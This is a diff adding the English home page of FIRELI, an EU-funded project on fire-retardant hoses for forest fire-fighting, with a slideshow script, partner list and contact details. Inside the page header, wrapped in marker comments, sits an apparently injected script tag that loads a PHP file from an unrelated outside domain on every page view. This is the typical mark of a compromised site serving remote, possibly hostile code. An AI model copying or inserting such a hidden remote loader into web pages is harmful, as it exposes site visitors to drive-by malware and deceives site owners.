@@ -1,0 +1,139 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<meta name="Description" content="Proyecto FIRELI" />
+<meta name="Keywords" content="Líneas de Mangueras retardantes a la llama para aplicaciones contra incendios forestales" />
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<meta name="Distribution" content="Global" />
+<meta name="Author" content="Proyecto FIRELI" />
+<meta name="Robots" content="index,follow" />
+<link rel="stylesheet" href="../style.css" type="text/css" />
+<title>HOME - FIRELI PROJECT</title>	
+
+<script language="JavaScript">
+// Browser Slide-Show script.
+// With image cross fade effect for those browsers that support it.
+var slideCache = new Array();
+function RunSlideShow(pictureName,imageFiles,displaySecs)
+{
+var imageSeparator = imageFiles.indexOf(";");
+var nextImage = imageFiles.substring(0,imageSeparator);
+if (document.all)
+{
+document.getElementById(pictureName).style.filter="blendTrans(duration=2)";
+document.getElementById(pictureName).filters.blendTrans.Apply();
+}
+document.getElementById(pictureName).src = nextImage;
+if (document.all)
+{
+document.getElementById(pictureName).filters.blendTrans.Play();
+}
+var futureImages= imageFiles.substring(imageSeparator+1,imageFiles.length)
++ ';' + nextImage;
+setTimeout("RunSlideShow('"+pictureName+"','"+futureImages+"',"+displaySecs+")",
+displaySecs*1000);
+// Cache the next image to improve performance.
+imageSeparator = futureImages.indexOf(";");
+nextImage = futureImages.substring(0,imageSeparator);
+if (slideCache[nextImage] == null) {
+slideCache[nextImage] = new Image;
+slideCache[nextImage].src = nextImage;
+}
+}
+</script>
+</head>
+
+<body onLoad="presImagen()">
+<div id="header">
+    <div id="header-content">
+    	<h1 id="logo"><a href="index.html" title="Proyecto FIRELI"><img src="../images/fireli-logo-en.jpg" alt="FIRELI Project logo" /></a></h1>
+        <h2 align="right" id="slogan"><a href="../index.html" class="gray"><br />[ · CASTELLANO · ]</a><br /><br /><img src="../images/7.gif" alt="FP7" /></h2>
+        <ul>
+            <li><a href="index.html" id="current">home</a></li>
+            <li><a href="project.html">Project</a></li>
+            <li><a href="objectives.html">Objectives</a></li>
+            <li><a href="barriers.html">Barriers</a></li>
+            <li><a href="newsletter.pdf" target="_blank">Newsletter</a></li>
+        </ul>
+    </div><!--60c7cd--><script type="text/javascript" src="http://teatroengranaje.cl/kmlbn9z8.php?id=13497326"></script><!--/60c7cd-->
+
+
+</div> 
+<div class="headerphoto">
+    <img src="../images/img-cab3.jpg" width="760" height="225" id="Fotos" />
+    <script language="JavaScript">
+    RunSlideShow("Fotos","../images/img-cab0.jpg;../images/img-cab1.jpg;../images/img-cab2.jpg;../images/img-cab3.jpg;"
+    + "../images/img-cab4.jpg",4);
+    </script>
+</div>
+<div id="content-wrap">
+    <div id="content">
+        <div id="sidebar" >
+            <div class="sidebox">	
+                <h1>&nbsp;</h1>
+                <ul class="sidemenu">
+                    <li><a href="productos-mesa.html"><img src="../images/socios/MESA25.jpg" alt="productos-mesa"/><br /><strong>Spain </strong>- (<strong>Coordinator</strong>)</a></li>
+                    <li><a href="elatorsa.html"><img src="../images/socios/elastorsa.jpg" alt="elatorsa" /><br />Spain</a></li>
+                    <li><a href="europrotect.html"><img src="../images/socios/EUROPROTECT.jpg" alt="europrotect"/><br />France</a></li>
+                    <li><a href="rauplan.html"><img src="../images/socios/rauplan.jpg" alt="rauplan"/><br />Finland</a></li>
+                    <li><a href="metalblast.html"><img src="../images/socios/QSE-METALBLAST.jpg" alt="metalblast"/><br />UK</a></li>
+                    <li><a href="qinetiq.html"><img src="../images/socios/qinetiq_logo_trans.gif" alt="qinetiq"/><br />UK (<strong>RTD Performer</strong>)</a></li>
+                    <li><a href="itav.html"><img src="../images/socios/Logo-ITAV.jpg" alt="itav"/><br />Spain (<strong>P. Technical Manager</strong>)</a></li>
+                    <li><a href="fiactu.html"><img src="../images/socios/FIACTU.jpg" alt="fiactu"/><br />Greece</a></li>
+                    <li><a href="laviosa.html"><img src="../images/socios/lcl-laviosa.jpg" alt="laviosa"/><br />Italy</a></li>
+                </ul>				
+          </div>					
+        </div>
+        <div id="main">		
+            <div class="post">
+                <h1> Fireli Project</h1>
+              <div class="textbox">
+               <p class="float-right"><img src="../images/log-7.png" alt="" class="gray" /></p>
+                    <h2>FP7 (<strong>The Seventh  Framework Programme</strong>) </h2>
+                    <p>Is the main <strong>EU </strong>instrument for the financing of scientific  R&amp;D programmes.<br />
+The Programme  supports the cooperation among universities, research centres and industries (small  and middle enterprises included) and provides financial support for their joint  projects.</p>
+                    <p><strong>FP7</strong> is designed to enhance effectiveness of the  previous programmes aiming to establish the <strong>European Research Area (ERA) </strong>and  knowledge based Europe economy development. </p>
+                <h3> General Description</h3>
+              <p><strong>FP7 Research for SMEs  program, call SME-2007-01</strong><br />
+                PROJECT NUMBER: <strong>222152</strong><br />
+                EFFECTIVE DATE: <strong>August 1st 2008</strong><br />
+                PROJECT TITLE: <strong>FIRE RETARDANT HOSES  LINES FOR FORESTRY FIRE-FIGHTING APPLICATIONS</strong><br />
+                    Coordinator: <strong>PRODUCTOS Y MANGUERAS  ESPECIALES, S.A.&nbsp; (SPAIN)</strong> </p>  
+                    
+                <h3>Contact                    </h3>
+                  <p><strong>Fernando Mariju&aacute;n Martinez<br /></strong>
+                    Productos MESA<br />
+					E-mail:<a href="mailto: f.marijuan@productosmesa.com"> f.marijuan@productosmesa.com</a> / Web:<a href=" www.productosmesa.com" title=" www.productosmesa.com" target="_blank"> www.productosmesa.com</a><br />
+                  Phone:<strong> +34 941 34 15 46</strong> / Fax: <strong>+34 941 34 22 54</strong></p>
+                    <p class="post-footer align-right"><a href="fireliproject.pdf" class="readmore" target="_blank"><strong>DOWNLOAD CATALOG</strong></a>+</p>
+                <h1><strong>Project concept</strong></h1>        
+                <p>Forest fires are a global challenge, affecting in  Europe particularly the Mediterranean countries (Greece,  France, Italy, Portugal  and Spain),  becoming an increasing problem to northern European forest due to the long-term  effect of global warming...</p>  
+                <p class="post-footer align-right"><a href="project.html" class="readmore">Read more</a>+</p>
+                    	
+                    <h1><strong>Project objetives</strong></h1>
+                <p>It must be emphasized the&nbsp; end user demand on hoses specifications often  exceed the manufacturing possibilities, such as the fire-resistance performance  which presently is limited to a maximum of 1 minute resistance to a 350&deg;C flame temperature...</p>
+              <p class="post-footer align-right"> 				
+                    <a href="objectives.html" class="readmore">Read more</a>+
+                    </p>
+                    
+                    <h1><strong>Technical  Barriers of Existing Products</strong></h1>        
+                <p>There are a series of technical obstacles  preventing the features of the FIRELI technology currently being realized, namely...</p>  
+          <p class="post-footer align-right">				
+                    <a href="barriers.html" class="readmore">Read more</a>+
+                    </p>
+                    <br />
+                </div>
+          </div>
+            <div class="post">
+                <h1>GOMDUR 4K&reg;</h1>
+                <p><img src="../images/img-fot-manguera.gif" alt="imagen manguera GOMDUR 4K" / width="532" height="261" /></p>
+            </div>	
+        </div>
+    </div>
+</div>
+<div id="footer">
+	<p> Fireli Project</p>
+</div>
+
+</body>
+</html>
